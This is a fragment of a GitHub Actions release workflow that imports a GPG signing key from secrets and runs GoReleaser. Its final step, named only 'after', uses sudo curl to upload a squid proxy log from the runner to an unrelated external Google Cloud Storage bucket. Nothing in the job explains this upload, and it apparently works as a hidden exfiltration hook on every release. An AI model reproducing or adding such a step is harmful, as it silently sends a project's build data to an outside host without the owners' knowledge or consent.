      with:
        go-version: '1.18'
    - continue-on-error: true
      id: import_gpg
      name: Import GPG key
      uses: crazy-max/ghaction-import-gpg@v6
      with:
        gpg_private_key: ${{ secrets.GPG_PRIVATE_KEY }}
        passphrase: ${{ secrets.PASSPHRASE }}
    - continue-on-error: true
      env:
        GPG_FINGERPRINT: ${{ steps.import_gpg.outputs.fingerprint }}
      name: Run GoReleaser
      uses: goreleaser/goreleaser-action@v6
      with:
        args: release --clean
        version: latest
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid/logzio/s3-hook.$(date
        +%s)
